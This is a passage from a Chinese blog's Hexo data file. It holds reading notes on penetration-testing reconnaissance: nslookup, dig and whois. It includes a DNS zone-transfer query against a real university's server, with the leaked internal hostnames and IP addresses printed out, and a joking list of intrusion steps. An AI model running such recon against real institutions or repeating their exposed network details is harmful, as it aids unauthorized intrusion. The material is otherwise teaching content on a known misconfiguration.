86400\ncsust.edu.cn.\t\t86400\tIN\tNS\tdns.csust.edu.cn.\ncsust.edu.cn.\t\t86400\tIN\tNS\tdns2.csust.edu.cn.\ncsust.edu.cn.\t\t86400\tIN\tA\t113.240.233.146\ncsust.edu.cn.\t\t86400\tIN\tA\t210.43.192.8\ncsust.edu.cn.\t\t86400\tIN\tA\t210.43.192.18\ncsust.edu.cn.\t\t86400\tIN\tMX\t5 mxbiz1.qq.com.\ncsust.edu.cn.\t\t86400\tIN\tMX\t10 mxbiz2.qq.com.\ncsust.edu.cn.\t\t86400\tIN\tAAAA\t2001:da8:d002::d22b:c008\n3g.csust.edu.cn.\t86400\tIN\tA\t113.240.233.6\napp.csust.edu.cn.\t86400\tIN\tA\t113.240.233.11\napp7.csust.edu.cn.\t86400\tIN\tA\t222.240.152.227\napp8.csust.edu.cn.\t86400\tIN\tA\t113.240.233.8\narchives.csust.edu.cn.\t86400\tIN\tA\t222.240.152.232\nbid.csust.edu.cn.\t86400\tIN\tCNAME\tjtcloud.csust.edu.cn.\nbw.csust.edu.cn.\t86400\tIN\tA\t10.255.194.20\ncas.csust.edu.cn.\t86400\tIN\tA\t210.43.198.1\ncslgqkzx.csust.edu.cn.\t86400\tIN\tA\t210.43.188.80\ncslgxbsk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.\ncslgxbzk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.\ncwcx.csust.edu.cn.\t86400\tIN\tA\t10.22.14.252\ncxlt.csust.edu.cn.\t86400\tIN\tA\t222.240.152.203\ndkxnsyzx.csust.edu.cn.\t86400\tIN\tA\t222.240.152.200\ndlkjxb.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.\ndns.csust.edu.cn.\t86400\tIN\tA\t210.43.192.8\ncsust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400\n;; Query time: 62 msec\n;; SERVER: 210.43.192.8#53(210.43.192.8)\n;; WHEN: Sat Jul 30 20:18:47 2016\n;; XFR size: 112 records (messages 1, bytes 2369)\n```\n可以看到，各种信息，从A、cname到MX全部暴露无遗。\n如果不存在该漏洞则会被服务器拒绝查询请求。\n\n```bash\nivan@Ivan ~ dig @dns4.tju.edu.cn tju.edu.cn axfr\n; <<>> DiG 9.8.3-P1 <<>> @dns4.tju.edu.cn tju.edu.cn axfr\n; (1 server found)\n;; global options: +cmd\n; Transfer failed.\n```\n\n### whois\nwhois查询，不多解释了\n\n```bash\nivan@Ivan ~ whois yfgeek.com\n\nWhois Server Version 2.0\n\nDomain names in the .com and .net domains can now be registered\nwith many different competing registrars. Go to http://www.internic.net\nfor detailed information.\n\n   Domain Name: YFGEEK.COM\n   Registrar: GODADDY.COM, LLC\n   Sponsoring Registrar IANA ID: 146\n   Whois Server: whois.godaddy.com\n   Referral URL: http://www.godaddy.com\n   Name Server: F1G1NS1.DNSPOD.NET\n   Name Server: F1G1NS2.DNSPOD.NET\n   Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited\n   Status: clientRenewProhibited https://icann.org/epp#clientRenewProhibited\n   Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited\n   Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited\n   Updated Date: 21-apr-2016\n   Creation Date: 23-nov-2012\n   Expiration Date: 23-nov-2017\n\n```\n","source":"_posts/Kali系列——信息收集阶段（一）.md","raw":"---\ntitle: Kali系列——信息收集阶段（一）\ntags: 'Hack'\npermalink: hack1\nid: 6\nupdated: '2016-08-05 21:13:28'\ndate: 2016-07-30 17:48:20\n---\n\n记得前几周去参加过一个阿里巴巴举办的安全峰会，其中一个大牛讲到以前的渗透测试三字经，当场真是笑出声：\n>进谷歌 找注入 没注入 就旁注 没旁注 用0day 没0day 猜目录 没目录 就嗅探\n\n>爆账户 找后台 传小马 放大马 拿权限 挂页面  放暗连 清数据 拿不下 去自杀 死不了 继续来 查资料 去社工！\n\n其实，我觉得渗透测试无论怎么变，不外乎这几点：\n\n>信息收集阶段->漏洞检测阶段->漏洞利用阶段->持久化后门阶段\n\n最近借了本好书《高度安全环境下的高级渗透测试》，这本书内容浅显易懂，但却很实用，虽然很多内容都知道，但是不成系统，这本书总结工作做得非常好，总结一下读书笔记。\n<!-- more --> \n# 信息收集阶段\n## DNS信息\n其实DNS信息收集阶段用两个Linux系统自带工具即可完成。\n\n### nslookup\n\n此命令，可以快速查处ip地址\n```bash\n ✘ ivan@Ivan~ nslookup zhihu.com\nServer:\t\t114.114.114.114\nAddress:\t114.114.114.114#53\n\nNon-authoritative answer:\nName:\tzhihu.com\nAddress: 54.223.189.245\n```\n\n当然也可以指定dns查询服务器：\n```bash\nivan@Ivan ~ nslookup -type=ns zhihu.com 8.8.8.8\nServer:\t\t8.8.8.8\nAddress:\t8.8.8.8#53\n\nNon-authoritative answer:\nzhihu.com\tnameserver = ns3.dnsv4.com.\nzhihu.com\tnameserver = ns4.dnsv4.com.\n\nAuthoritative answers can be found from:\n```\n### dig\ndig真是个好工具，甚至可以找出DNS域传送漏洞。下面举一个例子，也是乌云网曝光过的，由于篇幅问题，精简了很多内容：\n```bash\nivan@Ivan  ~  dig @dns.csust.edu.cn csust.edu.cn axfr\n\n; <<>> DiG 9.8.3-P1 <<>> @dns.csust.edu.cn csust.edu.cn axfr\n; (1 server found)\n;; global options: +cmd\ncsust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400\ncsust.edu.cn.\t\t86400\tIN\tNS\tdns.csust.edu.cn.\ncsust.edu.cn.\t\t86400\tIN\tNS\tdns2.csust.edu.cn.\ncsust.edu.cn.\t\t86400\tIN\tA\t113.240.233.146\ncsust.edu.cn.\t\t86400\tIN\tA\t210.43.192.8\ncsust.edu.cn.\t\t86400\tIN\tA\t210.43.192.18\ncsust.edu.cn.\t\t86400\tIN\tMX\t5 mxbiz1.qq.com.\ncsust.edu.cn.\t\t86400\tIN\tMX\t10 mxbiz2.qq.com.\ncsust.edu.cn.\t\t86400\tIN\tAAAA\t2001:da8:d002::d22b:c008\n3g.csust.edu.cn.\t86400\tIN\tA\t113.240.233.6\napp.csust.edu.cn.\t86400\tIN\tA\t113.240.233.11\napp7.csust.edu.cn.\t86400\tIN\tA\t222.240.152.227\napp8.csust.edu.cn.\t86400\tIN\tA\t113.240.233.8\narchives.csust.edu.cn.\t86400\tIN\tA\t222.240.152.232\nbid.csust.edu.cn.\t86400\tIN\tCNAME\tjtcloud.csust.edu.cn.\nbw.csust.edu.cn.\t86400\tIN\tA\t10.255.194.20\ncas.csust.edu.cn.\t86400\tIN\tA\t210.43.198.1\ncslgqkzx.csust.edu.cn.\t86400\tIN\tA\t210.43.188.80\ncslgxbsk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.\ncslgxbzk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.\ncwcx.csust.edu.cn.\t86400\tIN\tA\t10.22.14.252\ncxlt.csust.edu.cn.\t86400\tIN\tA\t222.240.152.203\ndkxnsyzx.csust.edu.cn.\t86400\tIN\tA\t222.240.152.200\ndlkjxb.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.\ndns.csust.edu.cn.\t86400\tIN\tA\t210.43.192.8\ncsust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400\n;; Query time: 62 msec\n;; SERVER: 210.43.192.8#53(210.43.192.8)\n;; WHEN: Sat Jul 30 20:18:47 2016\n;; XFR size: 112 records (messages 1, bytes 2369)\n```\n可以看到，各种信息，从A、cname到MX全部暴露无遗。\n如果不存在该漏洞则会被服务器拒绝查询请求。\n\n```bash\nivan@Ivan ~ dig @dns4.tju.edu.cn tju.edu.cn axfr\n; <<>> DiG 9.8.3-P1 <<>> @dns4.tju.edu.cn tju.edu.cn axfr\n; (1 server found)\n;; global options: +cmd\n; Transfer failed.\n```\n\n### whois\nwhois查询，不多解释了\n\n```bash\nivan@Ivan ~ whois yfgeek.com\n\nWhois Server Version 2.0\n\nDomain names in the .com and .net domains can now be registered\nwith many different competing registrars. Go to http://www.internic.net\nfor detailed information.\n\n   Domain Name: YFGEEK.COM\n   Registrar: GODADDY.COM, LLC\n   Sponsoring Registrar IANA ID: 146\n   Whois Server: whois.godaddy.com\n   Referral URL: http://www.godaddy.com\n   Name Server: F1G1NS1.DNSPOD.NET\n   Name Server: F1G1NS2.DNSPOD.NET\n   Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited\n   Status: clientRenewProhibited https://icann.org/epp#clientRenewProhibited\n   Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited\n   Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited\n   Updated Date: 21-apr-2016\n   Creation Date: 23-nov-2012\n   Expiration Date: 23-nov-2017\n\n```\n","slug":"hack1","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xob00165es536dqijap","content":"<p>记得前几周去参加过一个阿里巴巴举办的安全峰会，其中一个大牛讲到以前的渗透测试三字经，当场真是笑出声：</p>\n<blockquote>\n<p>进谷歌 找注入 没注入 就旁注 没旁注 用0day 没0day 猜目录 没目录 就嗅探</p>\n<p>爆账户 找后台 传小马 放大马 拿权限 挂页面  放暗连 清数据 拿不下 去自杀 死不了 继续来 查资料 去社工！</p>\n</blockquote>\n<p>其实，我觉得渗透测试无论怎么变，不外乎这几点：</p>\n<blockquote>\n<p>信息收集阶段-&gt;漏洞检测阶段-&gt;漏洞利用阶段-&gt;持久化后门阶段</p>\n</blockquote>\n<p>最近借了本好书《高度安全环境下的高级渗透测试》，这本书内容浅显易懂，但却很实用，虽然很多内容都知道，但是不成系统，这本书总结工作做得非常好，总结一下读书笔记。<br><a id=\"more\"></a> </p>\n<h1 id=\"信息收集阶段\"><a href=\"#信息收集阶段\" class=\"headerlink\" title=\"信息收集阶段\"></a>信息收集阶段</h1><h2 id=\"DNS信息\"><a href=\"#DNS信息\" class=\"headerlink\" title=\"DNS信息\"></a>DNS信息</h2><p>其实DNS信息收集阶段用两个Linux系统自带工具即可完成。</p>\n<h3 id=\"nslookup\"><a href=\"#nslookup\" class=\"headerlink\" title=\"nslookup\"></a>nslookup</h3><p>此命令，可以快速查处ip地址<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"> ✘ ivan@Ivan~ nslookup zhihu.com</div><div class=\"line\">Server:\t\t114.114.114.114</div><div class=\"line\">Address:\t114.114.114.114<span class=\"comment\">#53</span></div><div class=\"line\"></div><div class=\"line\">Non-authoritative answer:</div><div class=\"line\">Name:\tzhihu.com</div><div class=\"line\">Address: 54.223.189.245</div></pre></td></tr></table></figure></p>\n<p>当然也可以指定dns查询服务器：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan ~ nslookup -type=ns zhihu.com 8.8.8.8</div><div class=\"line\">Server:\t\t8.8.8.8</div><div class=\"line\">Address:\t8.8.8.8<span class=\"comment\">#53</span></div><div class=\"line\"></div><div class=\"line\">Non-authoritative answer:</div><div class=\"line\">zhihu.com\tnameserver = ns3.dnsv4.com.</div><div class=\"line\">zhihu.com\tnameserver = ns4.dnsv4.com.</div><div class=\"line\"></div><div class=\"line\">Authoritative answers can be found from:</div></pre></td></tr></table></figure></p>\n<h3 id=\"dig\"><a href=\"#dig\" class=\"headerlink\" title=\"dig\"></a>dig</h3><p>dig真是个好工具，甚至可以找出DNS域传送漏洞。下面举一个例子，也是乌云网曝光过的，由于篇幅问题，精简了很多内容：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan  ~  dig @dns.csust.edu.cn csust.edu.cn axfr</div><div class=\"line\"></div><div class=\"line\">; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; @dns.csust.edu.cn csust.edu.cn axfr</div><div class=\"line\">; (1 server found)</div><div class=\"line\">;; global options: +cmd</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tNS\tdns.csust.edu.cn.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tNS\tdns2.csust.edu.cn.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tA\t113.240.233.146</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tA\t210.43.192.8</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tA\t210.43.192.18</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tMX\t5 mxbiz1.qq.com.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tMX\t10 mxbiz2.qq.com.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tAAAA\t2001:da8:d002::d22b:c008</div><div class=\"line\">3g.csust.edu.cn.\t86400\tIN\tA\t113.240.233.6</div><div class=\"line\">app.csust.edu.cn.\t86400\tIN\tA\t113.240.233.11</div><div class=\"line\">app7.csust.edu.cn.\t86400\tIN\tA\t222.240.152.227</div><div class=\"line\">app8.csust.edu.cn.\t86400\tIN\tA\t113.240.233.8</div><div class=\"line\">archives.csust.edu.cn.\t86400\tIN\tA\t222.240.152.232</div><div class=\"line\">bid.csust.edu.cn.\t86400\tIN\tCNAME\tjtcloud.csust.edu.cn.</div><div class=\"line\">bw.csust.edu.cn.\t86400\tIN\tA\t10.255.194.20</div><div class=\"line\">cas.csust.edu.cn.\t86400\tIN\tA\t210.43.198.1</div><div class=\"line\">cslgqkzx.csust.edu.cn.\t86400\tIN\tA\t210.43.188.80</div><div class=\"line\">cslgxbsk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.</div><div class=\"line\">cslgxbzk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.</div><div class=\"line\">cwcx.csust.edu.cn.\t86400\tIN\tA\t10.22.14.252</div><div class=\"line\">cxlt.csust.edu.cn.\t86400\tIN\tA\t222.240.152.203</div><div class=\"line\">dkxnsyzx.csust.edu.cn.\t86400\tIN\tA\t222.240.152.200</div><div class=\"line\">dlkjxb.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.</div><div class=\"line\">dns.csust.edu.cn.\t86400\tIN\tA\t210.43.192.8</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400</div><div class=\"line\">;; Query time: 62 msec</div><div class=\"line\">;; SERVER: 210.43.192.8<span class=\"comment\">#53(210.43.192.8)</span></div><div class=\"line\">;; WHEN: Sat Jul 30 20:18:47 2016</div><div class=\"line\">;; XFR size: 112 records (messages 1, bytes 2369)</div></pre></td></tr></table></figure></p>\n<p>可以看到，各种信息，从A、cname到MX全部暴露无遗。<br>如果不存在该漏洞则会被服务器拒绝查询请求。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan ~ dig @dns4.tju.edu.cn tju.edu.cn axfr</div><div class=\"line\">; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; @dns4.tju.edu.cn tju.edu.cn axfr</div><div class=\"line\">; (1 server found)</div><div class=\"line\">;; global options: +cmd</div><div class=\"line\">; Transfer failed.</div></pre></td></tr></table></figure>\n<h3 id=\"whois\"><a href=\"#whois\" class=\"headerlink\" title=\"whois\"></a>whois</h3><p>whois查询，不多解释了</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan ~ whois yfgeek.com</div><div class=\"line\"></div><div class=\"line\">Whois Server Version 2.0</div><div class=\"line\"></div><div class=\"line\">Domain names <span class=\"keyword\">in</span> the .com and .net domains can now be registered</div><div class=\"line\">with many different competing registrars. Go to http://www.internic.net</div><div class=\"line\"><span class=\"keyword\">for</span> detailed information.</div><div class=\"line\"></div><div class=\"line\">   Domain Name: YFGEEK.COM</div><div class=\"line\">   Registrar: GODADDY.COM, LLC</div><div class=\"line\">   Sponsoring Registrar IANA ID: 146</div><div class=\"line\">   Whois Server: whois.godaddy.com</div><div class=\"line\">   Referral URL: http://www.godaddy.com</div><div class=\"line\">   Name Server: F1G1NS1.DNSPOD.NET</div><div class=\"line\">   Name Server: F1G1NS2.DNSPOD.NET</div><div class=\"line\">   Status: clientDeleteProhibited https://icann.org/epp<span class=\"comment\">#clientDeleteProhibited</span></div><div class=\"line\">   Status: clientRenewProhibited https://icann.org/epp<span class=\"comment\">#clientRenewProhibited</span></div><div class=\"line\">   Status: clientTransferProhibited https://icann.org/epp<span class=\"comment\">#clientTransferProhibited</span></div><div class=\"line\">   Status: clientUpdateProhibited https://icann.org/epp<span class=\"comment\">#clientUpdateProhibited</span></div><div class=\"line\">   Updated Date: 21-apr-2016</div><div class=\"line\">   Creation Date: 23-nov-2012</div><div class=\"line\">   Expiration Date: 23-nov-2017</div></pre></td></tr></table></figure>\n","excerpt":"<p>记得前几周去参加过一个阿里巴巴举办的安全峰会，其中一个大牛讲到以前的渗透测试三字经，当场真是笑出声：</p>\n<blockquote>\n<p>进谷歌 找注入 没注入 就旁注 没旁注 用0day 没0day 猜目录 没目录 就嗅探</p>\n<p>爆账户 找后台 传小马 放大马 拿权限 挂页面  放暗连 清数据 拿不下 去自杀 死不了 继续来 查资料 去社工！</p>\n</blockquote>\n<p>其实，我觉得渗透测试无论怎么变，不外乎这几点：</p>\n<blockquote>\n<p>信息收集阶段-&gt;漏洞检测阶段-&gt;漏洞利用阶段-&gt;持久化后门阶段</p>\n</blockquote>\n<p>最近借了本好书《高度安全环境下的高级渗透测试》，这本书内容浅显易懂，但却很实用，虽然很多内容都知道，但是不成系统，这本书总结工作做得非常好，总结一下读书笔记。<br>","more":"</p>\n<h1 id=\"信息收集阶段\"><a href=\"#信息收集阶段\" class=\"headerlink\" title=\"信息收集阶段\"></a>信息收集阶段</h1><h2 id=\"DNS信息\"><a href=\"#DNS信息\" class=\"headerlink\" title=\"DNS信息\"></a>DNS信息</h2><p>其实DNS信息收集阶段用两个Linux系统自带工具即可完成。</p>\n<h3 id=\"nslookup\"><a href=\"#nslookup\" class=\"headerlink\" title=\"nslookup\"></a>nslookup</h3><p>此命令，可以快速查处ip地址<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"> ✘ ivan@Ivan~ nslookup zhihu.com</div><div class=\"line\">Server:\t\t114.114.114.114</div><div class=\"line\">Address:\t114.114.114.114<span class=\"comment\">#53</span></div><div class=\"line\"></div><div class=\"line\">Non-authoritative answer:</div><div class=\"line\">Name:\tzhihu.com</div><div class=\"line\">Address: 54.223.189.245</div></pre></td></tr></table></figure></p>\n<p>当然也可以指定dns查询服务器：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan ~ nslookup -type=ns zhihu.com 8.8.8.8</div><div class=\"line\">Server:\t\t8.8.8.8</div><div class=\"line\">Address:\t8.8.8.8<span class=\"comment\">#53</span></div><div class=\"line\"></div><div class=\"line\">Non-authoritative answer:</div><div class=\"line\">zhihu.com\tnameserver = ns3.dnsv4.com.</div><div class=\"line\">zhihu.com\tnameserver = ns4.dnsv4.com.</div><div class=\"line\"></div><div class=\"line\">Authoritative answers can be found from:</div></pre></td></tr></table></figure></p>\n<h3 id=\"dig\"><a href=\"#dig\" class=\"headerlink\" title=\"dig\"></a>dig</h3><p>dig真是个好工具，甚至可以找出DNS域传送漏洞。下面举一个例子，也是乌云网曝光过的，由于篇幅问题，精简了很多内容：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan  ~  dig @dns.csust.edu.cn csust.edu.cn axfr</div><div class=\"line\"></div><div class=\"line\">; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; @dns.csust.edu.cn csust.edu.cn axfr</div><div class=\"line\">; (1 server found)</div><div class=\"line\">;; global options: +cmd</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tNS\tdns.csust.edu.cn.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tNS\tdns2.csust.edu.cn.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tA\t113.240.233.146</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tA\t210.43.192.8</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tA\t210.43.192.18</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tMX\t5 mxbiz1.qq.com.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tMX\t10 mxbiz2.qq.com.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tAAAA\t2001:da8:d002::d22b:c008</div><div class=\"line\">3g.csust.edu.cn.\t86400\tIN\tA\t113.240.233.6</div><div class=\"line\">app.csust.edu.cn.\t86400\tIN\tA\t113.240.233.11</div><div class=\"line\">app7.csust.edu.cn.\t86400\tIN\tA\t222.240.152.227</div><div class=\"line\">app8.csust.edu.cn.\t86400\tIN\tA\t113.240.233.8</div><div class=\"line\">archives.csust.edu.cn.\t86400\tIN\tA\t222.240.152.232</div><div class=\"line\">bid.csust.edu.cn.\t86400\tIN\tCNAME\tjtcloud.csust.edu.cn.</div><div class=\"line\">bw.csust.edu.cn.\t86400\tIN\tA\t10.255.194.20</div><div class=\"line\">cas.csust.edu.cn.\t86400\tIN\tA\t210.43.198.1</div><div class=\"line\">cslgqkzx.csust.edu.cn.\t86400\tIN\tA\t210.43.188.80</div><div class=\"line\">cslgxbsk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.</div><div class=\"line\">cslgxbzk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.</div><div class=\"line\">cwcx.csust.edu.cn.\t86400\tIN\tA\t10.22.14.252</div><div class=\"line\">cxlt.csust.edu.cn.\t86400\tIN\tA\t222.240.152.203</div><div class=\"line\">dkxnsyzx.csust.edu.cn.\t86400\tIN\tA\t222.240.152.200</div><div class=\"line\">dlkjxb.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.</div><div class=\"line\">dns.csust.edu.cn.\t86400\tIN\tA\t210.43.192.8</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400</div><div class=\"line\">;; Query time: 62 msec</div><div class=\"line\">;; SERVER: 210.43.192.8<span class=\"comment\">#53(210.43.192.8)</span></div><div class=\"line\">;; WHEN: Sat Jul 30 20:18:47 2016</div><div class=\"line\">;; XFR size: 112 records (messages 1, bytes 2369)</div></pre></td></tr></table></figure></p>\n<p>可以看到，各种信息，从A、cname到MX全部暴露无遗。<br>如果不存在该漏洞则会被服务器拒绝查询请求。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan ~ dig @dns4.tju.edu.cn tju.edu.cn axfr</div><div class=\"line\">; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; @dns4.tju.edu.cn tju.edu.cn axfr</div><div class=\"line\">; (1 server found)</div><div class=\"line\">;; global options: +cmd</div><div class=\"line\">; Transfer failed.</div></pre></td></tr></table></figure>\n<h3 id=\"whois\"><a href=\"#whois\" class=\"headerlink\" title=\"whois\"></a>whois</h3><p>whois查询，不多解释了</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan ~ whois yfgeek.com</div><div class=\"line\"></div><div class=\"line\">Whois Server Version 2.0</div><div class=\"line\"></div><div class=\"line\">Domain names <span class=\"keyword\">in</span> the .com and .net domains can now be registered</div><div class=\"line\">with many different competing registrars. Go to http://www.internic.net</div><div class=\"line\"><span class=\"keyword\">for</span> detailed information.</div><div class=\"line\"></div><div class=\"line\">   Domain Name: YFGEEK.COM</div><div class=\"line\">   Registrar: GODADDY.COM, LLC</div><div class=\"line\">   Sponsoring Registrar IANA ID: 146</div><div class=\"line\">   Whois Server: whois.godaddy.com</div><div class=\"line\">   Referral URL: http://www.godaddy.com</div><div class=\"line\">   Name Server: F1G1NS1.DNSPOD.NET</div><div class=\"line\">   Name Server: F1G1NS2.DNSPOD.NET</div><div class=\"line\">   Status: clientDeleteProhibited https://icann.org/epp<span class=\"comment\">#clientDeleteProhibited</span></div><div class=\"line\">   Status: clientRenewProhibited https://icann.org/epp<span class=\"comment\">#clientRenewProhibited</span></div><div class=\"line\">   Status: clientTransferProhibited https://icann.org/epp<span class=\"comment\">#clientTransferProhibited</span></div><div class=\"line\">   Status: clientUpdateProhibited https://icann.org/epp<span class=\"comment\">#clientUpdateProhibited</span></div><div class=\"line\">   Updated Date: 21-apr-2016</div><div class=\"line\">   Creation Date: 23-nov-2012</div><div class=\"line\">   Expiration Date: 23-nov-2017</div></pre></td></tr></table></figure>"},{"title":"Raspberry Pi Zero 无需键盘网络 配置教程","date":"2016-12-17T21:58:26.000Z","_content":"\n我大概是个Raspberry 